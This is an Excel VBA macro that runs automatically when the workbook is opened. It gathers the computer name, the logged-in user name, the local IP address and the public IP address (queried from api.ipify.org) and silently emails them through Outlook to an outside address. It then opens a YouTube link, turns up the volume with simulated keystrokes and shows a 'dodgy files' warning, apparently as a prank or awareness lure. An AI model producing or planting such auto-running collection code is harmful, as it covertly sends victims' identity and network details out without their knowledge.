Private Sub Workbook_Open()
    Dim OutApp As Object
    Dim OutMail As Object
    Dim PCName As String
    Dim UserName As String
    Dim OpenedTime As String
    Dim LocalIPAddress As String
    Dim PublicIPAddress As String
    Dim WshShell As Object
    Dim i As Integer
    Dim x As Integer
    Dim WMI As Object
    Dim WMIService As Object
    Dim WMIObjectSet As Object
    Dim WMIObject As Object
    Dim Http As Object

    ' Get the computer name
    PCName = Environ("COMPUTERNAME")
    ' Get the logged-in user name
    UserName = Environ("USERNAME")
    ' Get the current date and time
    OpenedTime = Now
    
    ' Get the local IP address
    On Error Resume Next
    Set WMI = GetObject("winmgmts:\\.\root\cimv2")
    Set WMIService = WMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    For Each WMIObject In WMIService
        LocalIPAddress = Join(WMIObject.IPAddress, ", ")
        Exit For
    Next WMIObject
    On Error GoTo 0
    
    ' If unable to get the local IP address, set it to "Unknown"
    If LocalIPAddress = "" Then LocalIPAddress = "Unknown"

    ' Get the public IP address
    On Error Resume Next
    Set Http = CreateObject("MSXML2.XMLHTTP")
    Http.Open "GET", "https://api.ipify.org", False
    Http.Send
    PublicIPAddress = Http.ResponseText
    On Error GoTo 0
    
    ' If unable to get the public IP address, set it to "Unknown"
    If PublicIPAddress = "" Then PublicIPAddress = "Unknown"

    On Error Resume Next
    Set OutApp = CreateObject("Outlook.Application")
    Set OutMail = OutApp.CreateItem(0)
    
    With OutMail
        .To = "@outlook.co.uk"
        .Subject = "Hello from " & PCName & " - User: " & UserName
        .Body = "Hello!" & vbCrLf & _
                "This workbook was opened on: " & OpenedTime & vbCrLf & _
                "Local IP Address: " & LocalIPAddress & vbCrLf & _
                "Public IP Address: " & PublicIPAddress
        .Send
    End With
    
    On Error GoTo 0
    
    Set OutMail = Nothing
    Set OutApp = Nothing
    
    ' Open YouTube in the default browser
    ThisWorkbook.FollowHyperlink "https://www.youtube.com/watch?v=yYupif25zGE"
    
    ' Create WshShell object
    Set WshShell = CreateObject("WScript.Shell")
    
    ' Send increase volume key 5 times with a delay
    For i = 1 To 20
        WshShell.SendKeys (Chr(&HAF)) ' Increase volume key
    Next i
    
    Application.Wait (Now + TimeValue("0:00:05")) ' Wait for 1 second
    
    ' Send increase volume key 5 times with a delay
    For x = 1 To 20
        WshShell.SendKeys (Chr(&HAF)) ' Increase volume key
    Next x
    
    x = MsgBox("Someone has been clicking dodgy files!", 48 + 0, "No bonus for you!")
    
    Set WshShell = Nothing
End Sub
